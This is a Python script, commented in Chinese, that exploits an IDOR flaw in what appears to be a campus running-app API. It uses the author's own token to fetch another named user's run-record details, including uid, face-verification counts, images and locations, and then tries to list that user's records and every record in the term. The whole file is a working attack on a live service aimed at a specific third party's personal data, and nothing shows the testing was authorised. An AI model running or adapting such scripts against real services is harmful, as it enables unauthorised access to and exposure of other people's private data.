# -*- coding: utf-8 -*-
"""IDOR 越权读测试：用自己的 token 读别人 uid 的记录详情，看是否泄露。"""
import json
import os
import sys
import time

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE)
os.environ.setdefault("LEPAO2_CONFIG", os.path.join(BASE, "config.json"))

from lepao.accounts import AccountRegistry
from lepao.auth import AuthState


def main():
    reg = AccountRegistry(os.path.join(BASE, "config.json"))
    auth = AuthState(reg, reg.resolve())
    client = auth.make_client(pace=0.3)
    my_uid = auth.uid
    print(f"[0] 我的 uid={my_uid} token={auth.token[:8]}…")

    # 别人的 record_id（来自 getTermRunRecord 里 uid=17288316 曼巴肘击王 的记录）
    others = [
        ("511431", "曼巴肘击王 uid=17288316 北区3.55km 有效"),
        ("481537", "曼巴肘击王 uid=17288316 北区3.14km 有效"),
        ("368871", "曼巴肘击王 uid=17288316 南区2.50km 有效"),
    ]

    print("\n=== [1] IDOR 读别人记录（用我的 token） ===")
    for rid, desc in others:
        try:
            r = client.post("/v3/api.php/Run/recordDetailV270",
                            {"record_id": rid, "year_num": "2026"})
            if isinstance(r, dict):
                got_uid = r.get("uid")
                cap = r.get("capture_num")
                zfb = r.get("zfb_face_verify_num")
                file_img = str(r.get("file_img") or r.get("record_img") or "")[:80]
                failed = r.get("record_failed_reason")
                print(f"  [{rid}] {desc}")
                print(f"      -> uid={got_uid} (我={my_uid}) capture_num={cap} zfb_num={zfb} status={r.get('record_status')}")
                print(f"      -> failed_reason={failed!r}")
                if file_img:
                    print(f"      -> file_img={file_img}")
                if got_uid != str(my_uid) and got_uid is not None:
                    print(f"      ★★★ IDOR 成立！读到别人 uid={got_uid} 的记录")
            else:
                print(f"  [{rid}] 非JSON: {str(r)[:100]}")
        except Exception as e:
            print(f"  [{rid}] 异常 {e.__class__.__name__} {str(e)[:60]}")

    print("\n=== [2] 读别人记录列表 getTermRunRecord 看是否受 uid 约束 ===")
    try:
        r = client.post("/v3/api.php/WpRun/getTermRunRecord",
                        {"term_id": "13286", "page": 1, "uid": "17288316"})
        lst = r.get("list") if isinstance(r, dict) else None
        if lst:
            first = lst[0]
            print(f"  返回 {len(lst)} 条, 第一条 uid={first.get('uid')} record_id={first.get('id')}")
            if str(first.get("uid")) != str(my_uid):
                print(f"  ★★★ 列表 IDOR 成立！能列别人的记录")
        else:
            print(f"  -> {json.dumps(r, ensure_ascii=False)[:200]}")
    except Exception as e:
        print(f"  异常 {e}")

    print("\n=== [3] 全量记录列表 allRecordList 越权 ===")
    try:
        r = client.post("/v3/api.php/Run2/allRecordList", {"term_id": "13286", "page": 1})
        print(f"  -> {json.dumps(r, ensure_ascii=False)[:300]}")
    except Exception as e:
        print(f"  异常 {e.__class__.__name__}")


if __name__ == "__main__":
    main()
